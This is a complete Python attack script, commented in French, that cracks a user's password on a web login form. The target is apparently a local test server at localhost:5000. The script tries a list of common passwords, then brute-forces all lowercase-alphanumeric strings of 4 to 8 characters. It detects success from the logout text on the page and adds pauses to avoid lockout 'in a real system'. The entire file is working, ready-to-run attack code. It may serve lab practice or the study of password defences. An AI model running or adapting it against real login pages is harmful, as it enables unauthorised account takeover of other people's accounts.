import requests
import itertools
import string
import time

# Configuration
URL = "http://localhost:5000/login"
USERNAME = "user1"  # L'utilisateur dont nous voulons cracker le mot de passe
MIN_LENGTH = 4      # Longueur minimale du mot de passe
MAX_LENGTH = 8      # Longueur maximale du mot de passe
CHARS = string.ascii_lowercase + string.digits  # Caractères à essayer

# Utilisation d'un dictionnaire de mots de passe courants
COMMON_PASSWORDS = [
    "password", "123456", "123456789", "12345678", "12345", "1234567", "1234567890",
    "qwerty", "abc123", "111111", "123123", "admin", "letmein", "welcome", "monkey", 
    "login", "1234", "sunshine", "master", "666666", "password1", "123"
]

def try_login(username, password):
    """Tente de se connecter avec le nom d'utilisateur et mot de passe donnés"""
    session = requests.Session()
    try:
        response = session.post(URL, data={"username": username, "password": password})
        
        # Vérifie si la connexion a réussi (vérifie la présence du bouton de déconnexion)
        if "Déconnexion" in response.text:
            return True
        return False
    except requests.RequestException:
        print(f"Erreur de connexion lors de la tentative avec {password}")
        time.sleep(2)  # Attendre en cas d'erreur pour éviter le blocage
        return False

def dictionary_attack():
    """Tente une attaque par dictionnaire"""
    print(f"Démarrage de l'attaque par dictionnaire pour l'utilisateur '{USERNAME}'...")
    
    for password in COMMON_PASSWORDS:
        print(f"Essai: {password}")
        if try_login(USERNAME, password):
            print(f"\n[SUCCÈS] Mot de passe trouvé: {password}")
            return password
    
    print("Échec de l'attaque par dictionnaire.")
    return None

def brute_force_attack():
    """Tente une attaque par force brute"""
    print(f"Démarrage de l'attaque par force brute pour l'utilisateur '{USERNAME}'...")
    
    # Essaie toutes les combinaisons possibles
    for length in range(MIN_LENGTH, MAX_LENGTH + 1):
        print(f"Essai avec {length} caractères...")
        
        # Génère toutes les combinaisons possibles de la longueur actuelle
        for attempt in itertools.product(CHARS, repeat=length):
            password = ''.join(attempt)
            print(f"Essai: {password}", end='\r')
            
            if try_login(USERNAME, password):
                print(f"\n[SUCCÈS] Mot de passe trouvé: {password}")
                return password
            
            # Petite pause pour éviter d'être bloqué (dans un système réel)
            time.sleep(0.1)
    
    print("\nÉchec de l'attaque par force brute.")
    return None

if __name__ == "__main__":
    start_time = time.time()
    
    # Essai d'abord avec l'attaque par dictionnaire (plus rapide)
    password = dictionary_attack()
    
    # Si l'attaque par dictionnaire échoue, essayer l'attaque par force brute
    if not password:
        password = brute_force_attack()
    
    if password:
        elapsed_time = time.time() - start_time
        print(f"Attaque réussie en {elapsed_time:.2f} secondes.")
        print(f"Identifiants trouvés: {USERNAME}:{password}")
    else:
        print("Toutes les attaques ont échoué.")